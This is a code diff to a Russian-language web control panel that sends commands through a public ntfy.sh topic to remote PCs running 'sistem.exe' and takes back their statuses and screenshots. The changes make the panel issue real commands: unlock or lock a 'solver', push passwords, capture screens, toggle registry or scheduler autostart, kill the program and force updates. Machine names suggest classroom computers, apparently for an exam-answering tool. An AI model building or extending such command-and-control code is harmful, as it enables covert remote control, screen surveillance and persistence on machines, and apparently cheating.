@@ -929,7 +929,7 @@
 
       <div class="pc-scroll-list" id="pcScrollList">
         <!-- Кнопка Все ПК -->
-        <div class="pc-item pc-item-all active" onclick="selectPc(null)">
+        <div class="pc-item pc-item-all active" id="pcItemAll" onclick="selectPc(null)">
           <div class="pc-info">
             <span class="pc-icon">🌐</span>
             <div>
@@ -940,74 +940,13 @@
           <span class="status-pill unlocked">ONLINE</span>
         </div>
 
-        <!-- ПК 1 -->
-        <div class="pc-item" onclick="selectPc('DESKTOP-AYUB')">
-          <div class="pc-info">
-            <span class="pc-icon">💻</span>
-            <div>
-              <div class="pc-name">DESKTOP-AYUB</div>
-              <div class="pc-status-label">Готов к работе • v2.6.4</div>
-            </div>
+        <!-- Динамический список реальных ПК (без виртуальных тестов) -->
+        <div id="pcDynamicList">
+          <div style="padding: 28px 16px; text-align: center; color: var(--text-muted); font-size: 13px;">
+            <div style="font-size: 24px; margin-bottom: 8px;">📡</div>
+            <b>Ожидание подключения ПК...</b><br>
+            <span style="font-size: 11px; opacity: 0.7;">Запустите sistem.exe на компьютере</span>
           </div>
-          <span class="status-pill unlocked">ГОТОВ</span>
-        </div>
-
-        <!-- ПК 2 -->
-        <div class="pc-item" onclick="selectPc('PC-AUDITORIA-02')">
-          <div class="pc-info">
-            <span class="pc-icon">💻</span>
-            <div>
-              <div class="pc-name">PC-AUDITORIA-02</div>
-              <div class="pc-status-label">Заблокирован • v2.6.4</div>
-            </div>
-          </div>
-          <span class="status-pill locked">LOCKED</span>
-        </div>
-
-        <!-- ПК 3 -->
-        <div class="pc-item" onclick="selectPc('PC-AUDITORIA-03')">
-          <div class="pc-info">
-            <span class="pc-icon">💻</span>
-            <div>
-              <div class="pc-name">PC-AUDITORIA-03</div>
-              <div class="pc-status-label">Решает вопрос... • v2.6.3</div>
-            </div>
-          </div>
-          <span class="status-pill busy">BUSY</span>
-        </div>
-
-        <!-- Дополнительные ПК для демонстрации длинного списка скролла -->
-        <div class="pc-item" onclick="selectPc('PC-AUDITORIA-04')">
-          <div class="pc-info">
-            <span class="pc-icon">💻</span>
-            <div>
-              <div class="pc-name">PC-AUDITORIA-04</div>
-              <div class="pc-status-label">Готов к работе • v2.6.4</div>
-            </div>
-          </div>
-          <span class="status-pill unlocked">ГОТОВ</span>
-        </div>
-
-        <div class="pc-item" onclick="selectPc('PC-AUDITORIA-05')">
-          <div class="pc-info">
-            <span class="pc-icon">💻</span>
-            <div>
-              <div class="pc-name">PC-AUDITORIA-05</div>
-              <div class="pc-status-label">Заблокирован • v2.6.4</div>
-            </div>
-          </div>
-          <span class="status-pill locked">LOCKED</span>
-        </div>
-
-        <div class="pc-item" onclick="selectPc('PC-AUDITORIA-06')">
-          <div class="pc-info">
-            <span class="pc-icon">💻</span>
-            <div>
-              <div class="pc-name">PC-AUDITORIA-06</div>
-              <div class="pc-status-label">Готов к работе • v2.6.4</div>
-            </div>
-          </div>
-          <span class="status-pill unlocked">ГОТОВ</span>
         </div>
       </div>
     </aside>
@@ -1170,9 +1109,14 @@
   </div>
 
   <script>
+    // Канал связи Web Control (реальное управление без Telegram)
+    const WEB_CMD_TOPIC = "mca_cmd_ch_77";
+    const WEB_STATUS_TOPIC = "mca_status_ch_77";
+
     // Текущий выбранный ПК (null = Все ПК)
     let selectedPc = null;
     let autostartState = true;
+    let realPeers = {};
 
     // Пул API ключей (динамический массив)
     const _B_KEYS = [
@@ -1188,6 +1132,114 @@
       active: idx === 0
     }));
 
+    // Отправка реальной команды на ПК через интернет
+    async function sendWebCommand(action, payload = {}) {
+      const target = selectedPc || null;
+      const body = JSON.stringify({ action, target, ...payload, time: Date.now() });
+      try {
+        await fetch(`https://ntfy.sh/${WEB_CMD_TOPIC}`, {
+          method: 'POST',
+          body: body
+        });
+      } catch (err) {
+        console.error("Command send error:", err);
+      }
+    }
+
+    // Слушатель входящих данных от ПК в реальном времени (SSE)
+    function initRealtimeListener() {
+      try {
+        const es = new EventSource(`https://ntfy.sh/${WEB_STATUS_TOPIC}/sse`);
+        es.onmessage = (e) => {
+          try {
+            const raw = JSON.parse(e.data);
+            const data = typeof raw.message === 'string' ? JSON.parse(raw.message) : (raw.message || raw);
+            handleIncomingStatus(data);
+          } catch (err) {
+            // ignore non-json
+          }
+        };
+        es.onerror = () => {
+          // auto reconnects
+        };
+      } catch (e) {
+        console.error("SSE error", e);
+      }
+
+      // Каждые 3 секунды проверяем статус активности ПК (таймаут 10с)
+      setInterval(() => {
+        const now = Date.now();
+        let changed = false;
+        for (const pc in realPeers) {
+          if (now - realPeers[pc].lastSeen > 10000) {
+            delete realPeers[pc];
+            changed = true;
+          }
+        }
+        if (changed) renderPeersList();
+      }, 3000);
+    }
+
+    function handleIncomingStatus(data) {
+      if (!data || !data.pc) return;
+
+      if (data.type === 'heartbeat' || !data.type) {
+        realPeers[data.pc] = { ...data, lastSeen: Date.now() };
+        renderPeersList();
+      } else if (data.type === 'screenshot') {
+        if (!selectedPc || selectedPc === data.pc) {
+          document.getElementById('screenshotPcName').textContent = data.pc;
+          document.getElementById('screenshotImg').src = data.image;
+          document.getElementById('screenshotModal').classList.add('open');
+          addLog(data.pc, 'Скриншот экрана успешно получен и открыт!', 'success');
+          showToast(`📸 Снимок получен с: ${data.pc}`);
+        }
+      } else if (data.type === 'log') {
+        addLog(data.pc, data.text, data.log_type || 'normal');
+        showToast(`[${data.pc}] ${data.text}`);
+      }
+    }
+
+    function renderPeersList() {
+      const container = document.getElementById('pcDynamicList');
+      const pcNames = Object.keys(realPeers);
+      document.getElementById('activeCountBadge').textContent = `${pcNames.length} ПК онлайн`;
+
+      if (pcNames.length === 0) {
+        container.innerHTML = `
+          <div style="padding: 28px 16px; text-align: center; color: var(--text-muted); font-size: 13px;">
+            <div style="font-size: 24px; margin-bottom: 8px;">📡</div>
+            <b>Ожидание подключения ПК...</b><br>
+            <span style="font-size: 11px; opacity: 0.7;">Запустите sistem.exe на компьютере</span>
+          </div>
+        `;
+        return;
+      }
+
+      container.innerHTML = pcNames.map(pc => {
+        const info = realPeers[pc];
+        const isUnlocked = info.unlocked;
+        const isBusy = info.busy;
+        const statusClass = isBusy ? 'busy' : (isUnlocked ? 'unlocked' : 'locked');
+        const statusText = isBusy ? 'BUSY' : (isUnlocked ? 'ГОТОВ' : 'LOCKED');
+        const descText = isBusy ? 'Решает вопрос...' : (isUnlocked ? 'Готов к работе' : 'Заблокирован');
+        const activeClass = selectedPc === pc ? 'active' : '';
+
+        return `
+          <div class="pc-item ${activeClass}" onclick="selectPc('${escHtml(pc)}')">
+            <div class="pc-info">
+              <span class="pc-icon">💻</span>
+              <div>
+                <div class="pc-name">${escHtml(pc)}</div>
+                <div class="pc-status-label">${descText} • ${escHtml(info.version || 'v2.6.4')}</div>
+              </div>
+            </div>
+            <span class="status-pill ${statusClass}">${statusText}</span>
+          </div>
+        `;
+      }).join('');
+    }
+
     // ВЫБОР ПК ИЗ СПИСКА
     function selectPc(pcName) {
       selectedPc = pcName;
@@ -1196,7 +1248,8 @@
       items.forEach(el => el.classList.remove('active'));
 
       if (!pcName) {
-        items[0].classList.add('active');
+        const allBtn = document.getElementById('pcItemAll');
+        if (allBtn) allBtn.classList.add('active');
         document.getElementById('targetTitleDisplay').innerHTML = '🌐 <span>Все ПК в сети (Broadcast)</span>';
         document.getElementById('targetBadge').textContent = 'РЕЖИМ: ДЛЯ ВСЕХ';
         document.getElementById('targetBadge').style.borderColor = 'rgba(245, 158, 11, 0.4)';
@@ -1219,18 +1272,20 @@
     // 1. ВКЛЮЧИТЬ
     function handleTurnOn() {
       const target = selectedPc ? selectedPc : "ВСЕ ПК";
-      addLog(target, 'Сигнал: ВКЛЮЧИТЬ солвер (UNLOCKED) — разблокирован на 2 часа', 'success');
+      sendWebCommand('unlock');
+      addLog(target, 'Сигнал отправлен: ВКЛЮЧИТЬ солвер (UNLOCKED) — разблокирован на 2 часа', 'success');
       showToast(`🟢 Солвер включен на: ${target}`);
     }
 
     // 2. ВЫКЛЮЧИТЬ
     function handleTurnOff() {
       const target = selectedPc ? selectedPc : "ВСЕ ПК";
-      addLog(target, 'Сигнал: ВЫКЛЮЧИТЬ солвер (LOCKED) — заблокирован до ввода пароля', 'warn');
+      sendWebCommand('lock');
+      addLog(target, 'Сигнал отправлен: ВЫКЛЮЧИТЬ солвер (LOCKED) — заблокирован до ввода пароля', 'warn');
       showToast(`🔴 Солвер выключен (заблокирован) на: ${target}`);
     }
 
-    // 3. ПАРОЛИ
+    // 3. ПАРОЛИ (СПИСОК ЧЕРЕЗ ЗАПЯТУЮ)
     function handleSetPasswords() {
       const raw = document.getElementById('passwordsInput').value.trim();
       if (!raw) {
@@ -1246,21 +1301,17 @@
       container.innerHTML = passwords.map(p => `<span class="pass-tag">🔑 ${escHtml(p)}</span>`).join('');
 
       const target = selectedPc ? selectedPc : "ВСЕ ПК";
+      sendWebCommand('pass', { passwords });
       addLog(target, `Установлен список из ${passwords.length} паролей: [${passwords.join(', ')}]`, 'normal');
       showToast(`🔑 Установлено паролей: ${passwords.length} шт.`);
     }
 
     // 4. СКРИНШОТ
     function handleScreenshot() {
-      const target = selectedPc ? selectedPc : "DESKTOP-AYUB";
-      addLog(target, 'Запрос скриншота экрана...', 'normal');
-      showToast(`📸 Получение снимка с: ${target}...`);
-
-      document.getElementById('screenshotPcName').textContent = target;
-      setTimeout(() => {
-        document.getElementById('screenshotModal').classList.add('open');
-        addLog(target, 'Скриншот экрана успешно получен и открыт.', 'success');
-      }, 400);
+      const target = selectedPc ? selectedPc : "ВСЕ ПК";
+      sendWebCommand('screen');
+      addLog(target, 'Запрос скриншота экрана отправлен в сеть...', 'normal');
+      showToast(`📸 Запрос снимка с: ${target}...`);
     }
 
     function closeScreenshotModal() {
@@ -1271,6 +1322,7 @@
     function handleAutostartToggle() {
       const target = selectedPc ? selectedPc : "ВСЕ ПК";
       autostartState = !autostartState;
+      sendWebCommand('autostart', { enable: autostartState });
       const statusText = autostartState ? 'ВКЛЮЧЕН' : 'ОТКЛЮЧЕН';
       const type = autostartState ? 'success' : 'warn';
       addLog(target, `Автозапуск переключен: ${statusText} (реестр/планировщик)`, type);
@@ -1283,8 +1335,9 @@
       if (!confirm(`Вы действительно хотите УДАЛИТЬ/ЗАВЕРШИТЬ программу на: ${target}?`)) {
         return;
       }
+      sendWebCommand('kill');
       addLog(target, 'Отправлен экстренный сигнал УДАЛИТЬ: процесс убит, автозапуск очищен.', 'danger');
-      showToast(`🗑️ Программа удалена на: ${target}`);
+      showToast(`🗑️ Сигнал удаления отправлен на: ${target}`);
     }
 
     // 7. ОБНОВЛЕНИЕ
@@ -1294,23 +1347,23 @@
       const pBar = document.getElementById('updateProgressBar');
 
       pWrap.style.display = 'block';
-      pBar.style.width = '0%';
+      pBar.style.width = '25%';
 
-      addLog(target, 'Запущена процедура автообновления: загрузка sistem.exe...', 'normal');
+      sendWebCommand('update');
+      addLog(target, 'Запущена процедура автообновления: команда загрузки sistem.exe отправлена на ПК...', 'normal');
       showToast(`🚀 Загрузка обновления на: ${target}...`);
 
-      let progress = 0;
+      let progress = 25;
       const timer = setInterval(() => {
-        progress += 20;
+        progress += 25;
         pBar.style.width = progress + '%';
         if (progress >= 100) {
           clearInterval(timer);
           setTimeout(() => {
             pWrap.style.display = 'none';
             pBar.style.width = '0%';
-            addLog(target, 'Обновление завершено успешно! Процесс бесшовно перезапущен.', 'success');
-            showToast(`✅ Успешно обновлено на: ${target}!`);
-          }, 600);
+            addLog(target, 'Команда обновления передана на ПК.', 'success');
+          }, 800);
         }
       }, 300);
     }
@@ -1403,11 +1456,14 @@
 
     function fetchPeers() {
       showToast('🔄 Опрос компьютеров в сети...');
-      addLog('СЕТЬ', 'Опрос компьютеров завершен. Все статусы обновлены.', 'normal');
+      sendWebCommand('ping');
+      addLog('СЕТЬ', 'Отправлен широковещательный PING для обнаружения активных ПК.', 'normal');
     }
 
     // Инициализация при загрузке
     renderApiKeys();
+    initRealtimeListener();
+    fetchPeers();
   </script>
 </body>
 </html>
